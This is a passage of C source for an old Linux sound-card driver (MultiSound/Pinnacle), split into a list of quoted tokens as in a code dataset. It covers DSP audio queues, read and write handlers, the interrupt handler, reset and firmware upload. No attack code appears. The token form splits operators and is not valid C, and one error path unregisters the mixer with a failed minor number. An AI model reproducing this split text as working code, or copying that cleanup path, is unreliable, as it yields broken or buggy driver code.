"DAPQ_tail", "!", "=", "readw", "(", "dev", ".", "DAPQ", "+", "JQS_wHead", ")", "|", "|", "start", ")", "{", "register", "int", "bank_num", "=", "DAPQ_tail", "/", "PCTODSP_OFFSET", "(", "DAQDS__size", ")", ";", "register", "int", "n", ";", "unsigned", "long", "flags", ";", "/", "*", "Write", "the", "data", "to", "the", "new", "tail", "*", "/", "if", "(", "protect", ")", "{", "/", "*", "Critical", "section", ":", "protect", "fifo", "in", "non", "-", "interrupt", "*", "/", "spin_lock_irqsave", "(", "&", "dev", ".", "lock", ",", "flags", ")", ";", "n", "=", "msnd_fifo_read_io", "(", "&", "dev", ".", "DAPF", ",", "dev", ".", "base", "+", "bank_num", "*", "DAP_BUFF_SIZE", ",", "DAP_BUFF_SIZE", ")", ";", "spin_unlock_irqrestore", "(", "&", "dev", ".", "lock", ",", "flags", ")", ";", "}", "else", "{", "n", "=", "msnd_fifo_read_io", "(", "&", "dev", ".", "DAPF", ",", "dev", ".", "base", "+", "bank_num", "*", "DAP_BUFF_SIZE", ",", "DAP_BUFF_SIZE", ")", ";", "}", "if", "(", "!", "n", ")", "break", ";", "if", "(", "start", ")", "start", "=", "0", ";", "/", "*", "Get", "our", "digital", "audio", "queue", "struct", "*", "/", "DAQD", "=", "bank_num", "*", "DAQDS__size", "+", "dev", ".", "base", "+", "DAPQ_DATA_BUFF", ";", "/", "*", "Write", "size", "of", "this", "bank", "*", "/", "writew", "(", "n", ",", "DAQD", "+", "DAQDS_wSize", ")", ";", "+", "+", "nbanks", ";", "/", "*", "Then", "advance", "the", "tail", "*", "/", "DAPQ_tail", "=", "(", "++", "bank_num", "%", "3", ")", "*", "PCTODSP_OFFSET", "(", "DAQDS__size", ")", ";", "writew", "(", "DAPQ_tail", ",", "dev", ".", "DAPQ", "+", "JQS_wTail", ")", ";", "/", "*", "Tell", "the", "DSP", "to", "play", "the", "bank", "*", "/", "msnd_send_dsp_cmd", "(", "&", "dev", ",", "HDEX_PLAY_START", ")", ";", "}", "return", "nbanks", ";", "}", "static", "int", "dsp_read", "(", "char", "__user", "*", "buf", ",", "size_t", "len", ")", "{", "int", "count", "=", "len", ";", "char", "*", "page", "=", "(", "char", "*", ")", "__get_free_page", "(", "GFP_KERNEL", ")", ";", "int", "timeout", "=", "get_rec_delay_jiffies", "(", "DAR_BUFF_SIZE", ")", ";", "if", "(", "!", "page", ")", "return", "-", "ENOMEM", ";", "while", "(", "count", ">", "0", ")", "{", "int", "n", ",", "k", ";", "unsigned", "long", "flags", ";", "k", "=", "PAGE_SIZE", ";", "if", "(", "k", ">", "count", ")", "k", "=", "count", ";", "/", "*", "Critical", "section", ":", "protect", "fifo", "in", "non", "-", "interrupt", "*", "/", "spin_lock_irqsave", "(", "&", "dev", ".", "lock", ",", "flags", ")", ";", "n", "=", "msnd_fifo_read", "(", "&", "dev", ".", "DARF", ",", "page", ",", "k", ")", ";", "spin_unlock_irqrestore", "(", "&", "dev", ".", "lock", ",", "flags", ")", ";", "if", "(", "copy_to_user", "(", "buf", ",", "page", ",", "n", ")", ")", "{", "free_page", "(", "(", "unsigned", "long", ")", "page", ")", ";", "return", "-", "EFAULT", ";", "}", "buf", "+", "=", "n", ";", "count", "-", "=", "n", ";", "if", "(", "n", "=", "=", "k", "&", "&", "count", ")", "continue", ";", "if", "(", "!", "test_bit", "(", "F_READING", ",", "&", "dev", ".", "flags", ")", "&", "&", "dev", ".", "mode", "&", "FMODE_READ", ")", "{", "dev", ".", "last_recbank", "=", "-", "1", ";", "if", "(", "chk_send_dsp_cmd", "(", "&", "dev", ",", "HDEX_RECORD_START", ")", "=", "=", "0", ")", "set_bit", "(", "F_READING", ",", "&", "dev", ".", "flags", ")", ";", "}", "if", "(", "dev", ".", "rec_ndelay", ")", "{", "free_page", "(", "(", "unsigned", "long", ")", "page", ")", ";", "return", "count", "=", "=", "len", "?", "-", "EAGAIN", ":", "len", "-", "count", ";", "}", "if", "(", "count", ">", "0", ")", "{", "set_bit", "(", "F_READBLOCK", ",", "&", "dev", ".", "flags", ")", ";", "if", "(", "wait_event_interruptible_timeout", "(", "dev", ".", "readblock", ",", "test_bit", "(", "F_READBLOCK", ",", "&", "dev", ".", "flags", ")", ",", "timeout", ")", "<", "=", "0", ")", "clear_bit", "(", "F_READING", ",", "&", "dev", ".", "flags", ")", ";", "if", "(", "signal_pending", "(", "current", ")", ")", "{", "free_page", "(", "(", "unsigned", "long", ")", "page", ")", ";", "return", "-", "EINTR", ";", "}", "}", "}", "free_page", "(", "(", "unsigned", "long", ")", "page", ")", ";", "return", "len", "-", "count", ";", "}", "static", "int", "dsp_write", "(", "const", "char", "__user", "*", "buf", ",", "size_t", "len", ")", "{", "int", "count", "=", "len", ";", "char", "*", "page", "=", "(", "char", "*", ")", "__get_free_page", "(", "GFP_KERNEL", ")", ";", "int", "timeout", "=", "get_play_delay_jiffies", "(", "DAP_BUFF_SIZE", ")", ";", "if", "(", "!", "page", ")", "return", "-", "ENOMEM", ";", "while", "(", "count", ">", "0", ")", "{", "int", "n", ",", "k", ";", "unsigned", "long", "flags", ";", "k", "=", "PAGE_SIZE", ";", "if", "(", "k", ">", "count", ")", "k", "=", "count", ";", "if", "(", "copy_from_user", "(", "page", ",", "buf", ",", "k", ")", ")", "{", "free_page", "(", "(", "unsigned", "long", ")", "page", ")", ";", "return", "-", "EFAULT", ";", "}", "/", "*", "Critical", "section", ":", "protect", "fifo", "in", "non", "-", "interrupt", "*", "/", "spin_lock_irqsave", "(", "&", "dev", ".", "lock", ",", "flags", ")", ";", "n", "=", "msnd_fifo_write", "(", "&", "dev", ".", "DAPF", ",", "page", ",", "k", ")", ";", "spin_unlock_irqrestore", "(", "&", "dev", ".", "lock", ",", "flags", ")", ";", "buf", "+", "=", "n", ";", "count", "-", "=", "n", ";", "if", "(", "count", "&", "&", "n", "=", "=", "k", ")", "continue", ";", "if", "(", "!", "test_bit", "(", "F_WRITING", ",", "&", "dev", ".", "flags", ")", "&", "&", "(", "dev", ".", "mode", "&", "FMODE_WRITE", ")", ")", "{", "dev", ".", "last_playbank", "=", "-", "1", ";", "if", "(", "pack_DAPF_to_DAPQ", "(", "1", ")", ">", "0", ")", "set_bit", "(", "F_WRITING", ",", "&", "dev", ".", "flags", ")", ";", "}", "if", "(", "dev", ".", "play_ndelay", ")", "{", "free_page", "(", "(", "unsigned", "long", ")", "page", ")", ";", "return", "count", "=", "=", "len", "?", "-", "EAGAIN", ":", "len", "-", "count", ";", "}", "if", "(", "count", ">", "0", ")", "{", "set_bit", "(", "F_WRITEBLOCK", ",", "&", "dev", ".", "flags", ")", ";", "wait_event_interruptible_timeout", "(", "dev", ".", "writeblock", ",", "test_bit", "(", "F_WRITEBLOCK", ",", "&", "dev", ".", "flags", ")", ",", "timeout", ")", ";", "if", "(", "signal_pending", "(", "current", ")", ")", "{", "free_page", "(", "(", "unsigned", "long", ")", "page", ")", ";", "return", "-", "EINTR", ";", "}", "}", "}", "free_page", "(", "(", "unsigned", "long", ")", "page", ")", ";", "return", "len", "-", "count", ";", "}", "static", "ssize_t", "dev_read", "(", "struct", "file", "*", "file", ",", "char", "__user", "*", "buf", ",", "size_t", "count", ",", "loff_t", "*", "off", ")", "{", "int", "minor", "=", "iminor", "(", "file_inode", "(", "file", ")", ");", "if", "(", "minor", "=", "=", "dev", ".", "dsp_minor", ")", "return", "dsp_read", "(", "buf", ",", "count", ")", ";", "else", "return", "-", "EINVAL", ";", "}", "static", "ssize_t", "dev_write", "(", "struct", "file", "*", "file", ",", "const", "char", "__user", "*", "buf", ",", "size_t", "count", ",", "loff_t", "*", "off", ")", "{", "int", "minor", "=", "iminor", "(", "file_inode", "(", "file", ")", ");", "if", "(", "minor", "=", "=", "dev", ".", "dsp_minor", ")", "return", "dsp_write", "(", "buf", ",", "count", ")", ";", "else", "return", "-", "EINVAL", ";", "}", "static", "__inline__", "void", "eval_dsp_msg", "(", "register", "WORD", "wMessage", ")", "{", "switch", "(", "HIBYTE", "(", "wMessage", ")", ")", "{", "case", "HIMT_PLAY_DONE", ":", "if", "(", "dev", ".", "last_playbank", "=", "=", "LOBYTE", "(", "wMessage", ")", "|", "|", "!", "test_bit", "(", "F_WRITING", ",", "&", "dev", ".", "flags", ")", ")", "break", ";", "dev", ".", "last_playbank", "=", "LOBYTE", "(", "wMessage", ")", ";", "if", "(", "pack_DAPF_to_DAPQ", "(", "0", ")", "<", "=", "0", ")", "{", "if", "(", "!", "test_bit", "(", "F_WRITEBLOCK", ",", "&", "dev", ".", "flags", ")", ")", "{", "if", "(", "test_and_clear_bit", "(", "F_WRITEFLUSH", ",", "&", "dev", ".", "flags", ")", ")", "wake_up_interruptible", "(", "&", "dev", ".", "writeflush", ")", ";", "}", "clear_bit", "(", "F_WRITING", ",", "&", "dev", ".", "flags", ")", ";", "}", "if", "(", "test_and_clear_bit", "(", "F_WRITEBLOCK", ",", "&", "dev", ".", "flags", ")", ")", "wake_up_interruptible", "(", "&", "dev", ".", "writeblock", ")", ";", "break", ";", "case", "HIMT_RECORD_DONE", ":", "if", "(", "dev", ".", "last_recbank", "=", "=", "LOBYTE", "(", "wMessage", ")", ")", "break", ";", "dev", ".", "last_recbank", "=", "LOBYTE", "(", "wMessage", ")", ";", "pack_DARQ_to_DARF", "(", "dev", ".", "last_recbank", ")", ";", "if", "(", "test_and_clear_bit", "(", "F_READBLOCK", ",", "&", "dev", ".", "flags", ")", ")", "wake_up_interruptible", "(", "&", "dev", ".", "readblock", ")", ";", "break", ";", "case", "HIMT_DSP", ":", "switch", "(", "LOBYTE", "(", "wMessage", ")", ")", "{", "#", "ifndef", "MSND_CLASSIC", "case", "HIDSP_PLAY_UNDER", ":", "#", "endif", "case", "HIDSP_INT_PLAY_UNDER", ":", "/", "*", "printk", "(", "KERN_DEBUG", "LOGNAME", "\"", ":", "Play", "underflow", "\\", "n", "\"", ");", "*", "/", "clear_bit", "(", "F_WRITING", ",", "&", "dev", ".", "flags", ")", ";", "break", ";", "case", "HIDSP_INT_RECORD_OVER", ":", "/", "*", "printk", "(", "KERN_DEBUG", "LOGNAME", "\"", ":", "Record", "overflow", "\\", "n", "\"", ");", "*", "/", "clear_bit", "(", "F_READING", ",", "&", "dev", ".", "flags", ")", ";", "break", ";", "default", ":", "/", "*", "printk", "(", "KERN_DEBUG", "LOGNAME", "\"", ":", "DSP", "message", "%", "d", "0x", "%", "02x", "\\", "n", "\"", ",", "LOBYTE", "(", "wMessage", ")", ",", "LOBYTE", "(", "wMessage", ")", ");", "*", "/", "break", ";", "}", "break", ";", "case", "HIMT_MIDI_IN_UCHAR", ":", "if", "(", "dev", ".", "midi_in_interrupt", ")", "(", "*", "dev", ".", "midi_in_interrupt", ")", "(&", "dev", ")", ";", "break", ";", "default", ":", "/", "*", "printk", "(", "KERN_DEBUG", "LOGNAME", "\"", ":", "HIMT", "message", "%", "d", "0x", "%", "02x", "\\", "n", "\"", ",", "HIBYTE", "(", "wMessage", ")", ",", "HIBYTE", "(", "wMessage", ")", ");", "*", "/", "break", ";", "}", "}", "static", "irqreturn_t", "intr", "(", "int", "irq", ",", "void", "*", "dev_id", ")", "{", "/", "*", "Send", "ack", "to", "DSP", "*", "/", "msnd_inb", "(", "dev", ".", "io", "+", "HP_RXL", ")", ";", "/", "*", "Evaluate", "queued", "DSP", "messages", "*", "/", "while", "(", "readw", "(", "dev", ".", "DSPQ", "+", "JQS_wTail", ")", "!", "=", "readw", "(", "dev", ".", "DSPQ", "+", "JQS_wHead", ")", ")", "{", "register", "WORD", "wTmp", ";", "eval_dsp_msg", "(", "readw", "(", "dev", ".", "pwDSPQData", "+", "2", "*", "readw", "(", "dev", ".", "DSPQ", "+", "JQS_wHead", ")", "))", ";", "if", "(", "(", "wTmp", "=", "readw", "(", "dev", ".", "DSPQ", "+", "JQS_wHead", ")", "+", "1", ")", ">", "readw", "(", "dev", ".", "DSPQ", "+", "JQS_wSize", ")", ")", "writew", "(", "0", ",", "dev", ".", "DSPQ", "+", "JQS_wHead", ")", ";", "else", "writew", "(", "wTmp", ",", "dev", ".", "DSPQ", "+", "JQS_wHead", ")", ";", "}", "return", "IRQ_HANDLED", ";", "}", "static", "const", "struct", "file_operations", "dev_fileops", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "read", "=", "dev_read", ",", ".", "write", "=", "dev_write", ",", ".", "unlocked_ioctl", "=", "dev_ioctl", ",", ".", "open", "=", "dev_open", ",", ".", "release", "=", "dev_release", ",", ".", "llseek", "=", "noop_llseek", ",", "}", ";", "static", "int", "reset_dsp", "(", "void", ")", "{", "int", "timeout", "=", "100", ";", "msnd_outb", "(", "HPDSPRESET_ON", ",", "dev", ".", "io", "+", "HP_DSPR", ")", ";", "mdelay", "(", "1", ")", ";", "#", "ifndef", "MSND_CLASSIC", "dev", ".", "info", "=", "msnd_inb", "(", "dev", ".", "io", "+", "HP_INFO", ")", ";", "#", "endif", "msnd_outb", "(", "HPDSPRESET_OFF", ",", "dev", ".", "io", "+", "HP_DSPR", ")", ";", "mdelay", "(", "1", ")", ";", "while", "(", "timeout", "-", "-", ">", "0", ")", "{", "if", "(", "msnd_inb", "(", "dev", ".", "io", "+", "HP_CVR", ")", "=", "=", "HP_CVR_DEF", ")", "return", "0", ";", "mdelay", "(", "1", ")", ";", "}", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "Cannot", "reset", "DSP", "\\", "n", "\"", ");", "return", "-", "EIO", ";", "}", "static", "int", "__init", "probe_multisound", "(", "void", ")", "{", "#", "ifndef", "MSND_CLASSIC", "char", "*", "xv", ",", "*", "rev", "=", "NULL", ";", "char", "*", "pin", "=", "\"", "Pinnacle", "\"", ",", "*", "fiji", "=", "\"", "Fiji", "\"", ";", "char", "*", "pinfiji", "=", "\"", "Pinnacle", "/", "Fiji", "\"", ";", "#", "endif", "if", "(", "!", "request_region", "(", "dev", ".", "io", ",", "dev", ".", "numio", ",", "\"", "probing", "\"", "))", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "I", "/", "O", "port", "conflict", "\\", "n", "\"", ");", "return", "-", "ENODEV", ";", "}", "if", "(", "reset_dsp", "(", ")", "<", "0", ")", "{", "release_region", "(", "dev", ".", "io", ",", "dev", ".", "numio", ")", ";", "return", "-", "ENODEV", ";", "}", "#", "ifdef", "MSND_CLASSIC", "dev", ".", "name", "=", "\"", "Classic", "/", "Tahiti", "/", "Monterey", "\"", ";", "printk", "(", "KERN_INFO", "LOGNAME", "\"", ":", "%", "s", ",", "\"", "#", "else", "switch", "(", "dev", ".", "info", ">", ">", "4", ")", "{", "case", "0xf", ":", "xv", "=", "\"", "<=", "1", ".", "15", "\"", ";", "break", ";", "case", "0x1", ":", "xv", "=", "\"", "1", ".", "18", "/", "1", ".", "2", "\"", ";", "break", ";", "case", "0x2", ":", "xv", "=", "\"", "1", ".", "3", "\"", ";", "break", ";", "case", "0x3", ":", "xv", "=", "\"", "1", ".", "4", "\"", ";", "break", ";", "default", ":", "xv", "=", "\"", "unknown", "\"", ";", "break", ";", "}", "switch", "(", "dev", ".", "info", "&", "0x7", ")", "{", "case", "0x0", ":", "rev", "=", "\"", "I", "\"", ";", "dev", ".", "name", "=", "pin", ";", "break", ";", "case", "0x1", ":", "rev", "=", "\"", "F", "\"", ";", "dev", ".", "name", "=", "pin", ";", "break", ";", "case", "0x2", ":", "rev", "=", "\"", "G", "\"", ";", "dev", ".", "name", "=", "pin", ";", "break", ";", "case", "0x3", ":", "rev", "=", "\"", "H", "\"", ";", "dev", ".", "name", "=", "pin", ";", "break", ";", "case", "0x4", ":", "rev", "=", "\"", "E", "\"", ";", "dev", ".", "name", "=", "fiji", ";", "break", ";", "case", "0x5", ":", "rev", "=", "\"", "C", "\"", ";", "dev", ".", "name", "=", "fiji", ";", "break", ";", "case", "0x6", ":", "rev", "=", "\"", "D", "\"", ";", "dev", ".", "name", "=", "fiji", ";", "break", ";", "case", "0x7", ":", "rev", "=", "\"", "A", "-", "B", "(", "Fiji", ")", "or", "A", "-", "E", "(", "Pinnacle", ")", "\";", "dev", ".", "name", "=", "pinfiji", ";", "break", ";", "}", "printk", "(", "KERN_INFO", "LOGNAME", "\"", ":", "%", "s", "revision", "%", "s", ",", "Xilinx", "version", "%", "s", ",", "\"", "#", "endif", "/", "*", "MSND_CLASSIC", "*", "/", "\"", "I", "/", "O", "0x", "%", "x", "-", "0x", "%", "x", ",", "IRQ", "%", "d", ",", "memory", "mapped", "to", "%", "p", "-", "%", "p", "\\", "n", "\"", ",", "dev", ".", "name", ",", "#", "ifndef", "MSND_CLASSIC", "rev", ",", "xv", ",", "#", "endif", "dev", ".", "io", ",", "dev", ".", "io", "+", "dev", ".", "numio", "-", "1", ",", "dev", ".", "irq", ",", "dev", ".", "base", ",", "dev", ".", "base", "+", "0x7fff", ")", ";", "release_region", "(", "dev", ".", "io", ",", "dev", ".", "numio", ")", ";", "return", "0", ";", "}", "static", "int", "init_sma", "(", "void", ")", "{", "static", "int", "initted", ";", "WORD", "mastVolLeft", ",", "mastVolRight", ";", "unsigned", "long", "flags", ";", "#", "ifdef", "MSND_CLASSIC", "msnd_outb", "(", "dev", ".", "memid", ",", "dev", ".", "io", "+", "HP_MEMM", ")", ";", "#", "endif", "msnd_outb", "(", "HPBLKSEL_0", ",", "dev", ".", "io", "+", "HP_BLKS", ")", ";", "if", "(", "initted", ")", "{", "mastVolLeft", "=", "readw", "(", "dev", ".", "SMA", "+", "SMA_wCurrMastVolLeft", ")", ";", "mastVolRight", "=", "readw", "(", "dev", ".", "SMA", "+", "SMA_wCurrMastVolRight", ")", ";", "}", "else", "mastVolLeft", "=", "mastVolRight", "=", "0", ";", "memset_io", "(", "dev", ".", "base", ",", "0", ",", "0x8000", ")", ";", "/", "*", "Critical", "section", ":", "bank", "1", "access", "*", "/", "spin_lock_irqsave", "(", "&", "dev", ".", "lock", ",", "flags", ")", ";", "msnd_outb", "(", "HPBLKSEL_1", ",", "dev", ".", "io", "+", "HP_BLKS", ")", ";", "memset_io", "(", "dev", ".", "base", ",", "0", ",", "0x8000", ")", ";", "msnd_outb", "(", "HPBLKSEL_0", ",", "dev", ".", "io", "+", "HP_BLKS", ")", ";", "spin_unlock_irqrestore", "(", "&", "dev", ".", "lock", ",", "flags", ")", ";", "dev", ".", "pwDSPQData", "=", "(", "dev", ".", "base", "+", "DSPQ_DATA_BUFF", ")", ";", "dev", ".", "pwMODQData", "=", "(", "dev", ".", "base", "+", "MODQ_DATA_BUFF", ")", ";", "dev", ".", "pwMIDQData", "=", "(", "dev", ".", "base", "+", "MIDQ_DATA_BUFF", ")", ";", "/", "*", "Motorola", "56k", "shared", "memory", "base", "*", "/", "dev", ".", "SMA", "=", "dev", ".", "base", "+", "SMA_STRUCT_START", ";", "/", "*", "Digital", "audio", "play", "queue", "*", "/", "dev", ".", "DAPQ", "=", "dev", ".", "base", "+", "DAPQ_OFFSET", ";", "msnd_init_queue", "(", "dev", ".", "DAPQ", ",", "DAPQ_DATA_BUFF", ",", "DAPQ_BUFF_SIZE", ")", ";", "/", "*", "Digital", "audio", "record", "queue", "*", "/", "dev", ".", "DARQ", "=", "dev", ".", "base", "+", "DARQ_OFFSET", ";", "msnd_init_queue", "(", "dev", ".", "DARQ", ",", "DARQ_DATA_BUFF", ",", "DARQ_BUFF_SIZE", ")", ";", "/", "*", "MIDI", "out", "queue", "*", "/", "dev", ".", "MODQ", "=", "dev", ".", "base", "+", "MODQ_OFFSET", ";", "msnd_init_queue", "(", "dev", ".", "MODQ", ",", "MODQ_DATA_BUFF", ",", "MODQ_BUFF_SIZE", ")", ";", "/", "*", "MIDI", "in", "queue", "*", "/", "dev", ".", "MIDQ", "=", "dev", ".", "base", "+", "MIDQ_OFFSET", ";", "msnd_init_queue", "(", "dev", ".", "MIDQ", ",", "MIDQ_DATA_BUFF", ",", "MIDQ_BUFF_SIZE", ")", ";", "/", "*", "DSP", "-", ">", "host", "message", "queue", "*", "/", "dev", ".", "DSPQ", "=", "dev", ".", "base", "+", "DSPQ_OFFSET", ";", "msnd_init_queue", "(", "dev", ".", "DSPQ", ",", "DSPQ_DATA_BUFF", ",", "DSPQ_BUFF_SIZE", ")", ";", "/", "*", "Setup", "some", "DSP", "values", "*", "/", "#", "ifndef", "MSND_CLASSIC", "writew", "(", "1", ",", "dev", ".", "SMA", "+", "SMA_wCurrPlayFormat", ")", ";", "writew", "(", "dev", ".", "play_sample_size", ",", "dev", ".", "SMA", "+", "SMA_wCurrPlaySampleSize", ")", ";", "writew", "(", "dev", ".", "play_channels", ",", "dev", ".", "SMA", "+", "SMA_wCurrPlayChannels", ")", ";", "writew", "(", "dev", ".", "play_sample_rate", ",", "dev", ".", "SMA", "+", "SMA_wCurrPlaySampleRate", ")", ";", "#", "endif", "writew", "(", "dev", ".", "play_sample_rate", ",", "dev", ".", "SMA", "+", "SMA_wCalFreqAtoD", ")", ";", "writew", "(", "mastVolLeft", ",", "dev", ".", "SMA", "+", "SMA_wCurrMastVolLeft", ")", ";", "writew", "(", "mastVolRight", ",", "dev", ".", "SMA", "+", "SMA_wCurrMastVolRight", ")", ";", "#", "ifndef", "MSND_CLASSIC", "writel", "(", "0x00010000", ",", "dev", ".", "SMA", "+", "SMA_dwCurrPlayPitch", ")", ";", "writel", "(", "0x00000001", ",", "dev", ".", "SMA", "+", "SMA_dwCurrPlayRate", ")", ";", "#", "endif", "writew", "(", "0x303", ",", "dev", ".", "SMA", "+", "SMA_wCurrInputTagBits", ")", ";", "initted", "=", "1", ";", "return", "0", ";", "}", "static", "int", "__init", "calibrate_adc", "(", "WORD", "srate", ")", "{", "writew", "(", "srate", ",", "dev", ".", "SMA", "+", "SMA_wCalFreqAtoD", ")", ";", "if", "(", "dev", ".", "calibrate_signal", "=", "=", "0", ")", "writew", "(", "readw", "(", "dev", ".", "SMA", "+", "SMA_wCurrHostStatusFlags", ")", "|", "0x0001", ",", "dev", ".", "SMA", "+", "SMA_wCurrHostStatusFlags", ")", ";", "else", "writew", "(", "readw", "(", "dev", ".", "SMA", "+", "SMA_wCurrHostStatusFlags", ")", "&", "~", "0x0001", ",", "dev", ".", "SMA", "+", "SMA_wCurrHostStatusFlags", ")", ";", "if", "(", "msnd_send_word", "(", "&", "dev", ",", "0", ",", "0", ",", "HDEXAR_CAL_A_TO_D", ")", "=", "=", "0", "&", "&", "chk_send_dsp_cmd", "(", "&", "dev", ",", "HDEX_AUX_REQ", ")", "=", "=", "0", ")", "{", "schedule_timeout_interruptible", "(", "HZ", "/", "3", ")", ";", "return", "0", ";", "}", "printk", "(", "KERN_WARNING", "LOGNAME", "\"", ":", "ADC", "calibration", "failed", "\\", "n", "\"", ");", "return", "-", "EIO", ";", "}", "static", "int", "upload_dsp_code", "(", "void", ")", "{", "int", "ret", "=", "0", ";", "msnd_outb", "(", "HPBLKSEL_0", ",", "dev", ".", "io", "+", "HP_BLKS", ")", ";", "#", "ifndef", "HAVE_DSPCODEH", "INITCODESIZE", "=", "mod_firmware_load", "(", "INITCODEFILE", ",", "&", "INITCODE", ")", ";", "if", "(", "!", "INITCODE", ")", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "Error", "loading", "\"", "INITCODEFILE", ")", ";", "return", "-", "EBUSY", ";", "}", "PERMCODESIZE", "=", "mod_firmware_load", "(", "PERMCODEFILE", ",", "&", "PERMCODE", ")", ";", "if", "(", "!", "PERMCODE", ")", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "Error", "loading", "\"", "PERMCODEFILE", ")", ";", "vfree", "(", "INITCODE", ")", ";", "return", "-", "EBUSY", ";", "}", "#", "endif", "memcpy_toio", "(", "dev", ".", "base", ",", "PERMCODE", ",", "PERMCODESIZE", ")", ";", "if", "(", "msnd_upload_host", "(", "&", "dev", ",", "INITCODE", ",", "INITCODESIZE", ")", "<", "0", ")", "{", "printk", "(", "KERN_WARNING", "LOGNAME", "\"", ":", "Error", "uploading", "to", "DSP", "\\", "n", "\"", ");", "ret", "=", "-", "ENODEV", ";", "goto", "out", ";", "}", "#", "ifdef", "HAVE_DSPCODEH", "printk", "(", "KERN_INFO", "LOGNAME", "\"", ":", "DSP", "firmware", "uploaded", "(", "resident", ")", "\\", "n", "\"", ");", "#", "else", "printk", "(", "KERN_INFO", "LOGNAME", "\"", ":", "DSP", "firmware", "uploaded", "\\", "n", "\"", ");", "#", "endif", "out", ":", "#", "ifndef", "HAVE_DSPCODEH", "vfree", "(", "INITCODE", ")", ";", "vfree", "(", "PERMCODE", ")", ";", "#", "endif", "return", "ret", ";", "}", "#", "ifdef", "MSND_CLASSIC", "static", "void", "reset_proteus", "(", "void", ")", "{", "msnd_outb", "(", "HPPRORESET_ON", ",", "dev", ".", "io", "+", "HP_PROR", ")", ";", "mdelay", "(", "TIME_PRO_RESET", ")", ";", "msnd_outb", "(", "HPPRORESET_OFF", ",", "dev", ".", "io", "+", "HP_PROR", ")", ";", "mdelay", "(", "TIME_PRO_RESET_DONE", ")", ";", "}", "#", "endif", "static", "int", "initialize", "(", "void", ")", "{", "int", "err", ",", "timeout", ";", "#", "ifdef", "MSND_CLASSIC", "msnd_outb", "(", "HPWAITSTATE_0", ",", "dev", ".", "io", "+", "HP_WAIT", ")", ";", "msnd_outb", "(", "HPBITMODE_16", ",", "dev", ".", "io", "+", "HP_BITM", ")", ";", "reset_proteus", "(", ");", "#", "endif", "if", "(", "(", "err", "=", "init_sma", "(", "))", "<", "0", ")", "{", "printk", "(", "KERN_WARNING", "LOGNAME", "\"", ":", "Cannot", "initialize", "SMA", "\\", "n", "\"", ");", "return", "err", ";", "}", "if", "(", "(", "err", "=", "reset_dsp", "(", "))", "<", "0", ")", "return", "err", ";", "if", "(", "(", "err", "=", "upload_dsp_code", "(", "))", "<", "0", ")", "{", "printk", "(", "KERN_WARNING", "LOGNAME", "\"", ":", "Cannot", "upload", "DSP", "code", "\\", "n", "\"", ");", "return", "err", ";", "}", "timeout", "=", "200", ";", "while", "(", "readw", "(", "dev", ".", "base", ")", ")", "{", "mdelay", "(", "1", ")", ";", "if", "(", "!", "timeout", "-", "-)", "{", "printk", "(", "KERN_DEBUG", "LOGNAME", "\"", ":", "DSP", "reset", "timeout", "\\", "n", "\"", ");", "return", "-", "EIO", ";", "}", "}", "mixer_setup", "(", ");", "return", "0", ";", "}", "static", "int", "dsp_full_reset", "(", "void", ")", "{", "int", "rv", ";", "if", "(", "test_bit", "(", "F_RESETTING", ",", "&", "dev", ".", "flags", ")", "|", "|", "+", "+", "dev", ".", "nresets", ">", "10", ")", "return", "0", ";", "set_bit", "(", "F_RESETTING", ",", "&", "dev", ".", "flags", ")", ";", "printk", "(", "KERN_INFO", "LOGNAME", "\"", ":", "DSP", "reset", "\\", "n", "\"", ");", "dsp_halt", "(", "NULL", ")", ";", "/", "*", "Unconditionally", "halt", "*", "/", "if", "(", "(", "rv", "=", "initialize", "(", "))", ")", "printk", "(", "KERN_WARNING", "LOGNAME", "\"", ":", "DSP", "reset", "failed", "\\", "n", "\"", ");", "force_recsrc", "(", "dev", ".", "recsrc", ")", ";", "dsp_open", "(", "NULL", ")", ";", "clear_bit", "(", "F_RESETTING", ",", "&", "dev", ".", "flags", ")", ";", "return", "rv", ";", "}", "static", "int", "__init", "attach_multisound", "(", "void", ")", "{", "int", "err", ";", "if", "(", "(", "err", "=", "request_irq", "(", "dev", ".", "irq", ",", "intr", ",", "0", ",", "dev", ".", "name", ",", "&", "dev", ")", ")", "<", "0", ")", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "Couldn", "'", "t", "grab", "IRQ", "%", "d", "\\", "n", "\"", ",", "dev", ".", "irq", ")", ";", "return", "err", ";", "}", "if", "(", "request_region", "(", "dev", ".", "io", ",", "dev", ".", "numio", ",", "dev", ".", "name", ")", "=", "=", "NULL", ")", "{", "free_irq", "(", "dev", ".", "irq", ",", "&", "dev", ")", ";", "return", "-", "EBUSY", ";", "}", "err", "=", "dsp_full_reset", "(", ");", "if", "(", "err", "<", "0", ")", "{", "release_region", "(", "dev", ".", "io", ",", "dev", ".", "numio", ")", ";", "free_irq", "(", "dev", ".", "irq", ",", "&", "dev", ")", ";", "return", "err", ";", "}", "if", "(", "(", "err", "=", "msnd_register", "(", "&", "dev", ")", ")", "<", "0", ")", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "Unable", "to", "register", "MultiSound", "\\", "n", "\"", ");", "release_region", "(", "dev", ".", "io", ",", "dev", ".", "numio", ")", ";", "free_irq", "(", "dev", ".", "irq", ",", "&", "dev", ")", ";", "return", "err", ";", "}", "if", "(", "(", "dev", ".", "dsp_minor", "=", "register_sound_dsp", "(", "&", "dev_fileops", ",", "-", "1", ")", ")", "<", "0", ")", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "Unable", "to", "register", "DSP", "operations", "\\", "n", "\"", ");", "msnd_unregister", "(", "&", "dev", ")", ";", "release_region", "(", "dev", ".", "io", ",", "dev", ".", "numio", ")", ";", "free_irq", "(", "dev", ".", "irq", ",", "&", "dev", ")", ";", "return", "dev", ".", "dsp_minor", ";", "}", "if", "(", "(", "dev", ".", "mixer_minor", "=", "register_sound_mixer", "(", "&", "dev_fileops", ",", "-", "1", ")", ")", "<", "0", ")", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "Unable", "to", "register", "mixer", "operations", "\\", "n", "\"", ");", "unregister_sound_mixer", "(", "dev", ".", "mixer_minor", ")", ";", "msnd_unregister", "(", "&", "dev", ")", ";", "release_region", "(", "dev", ".", "io", ",", "dev", ".", "numio", ")", ";", "free_irq", "(", "dev", ".", "irq", ",", "&", "dev", ")", ";", "return", "dev", ".", 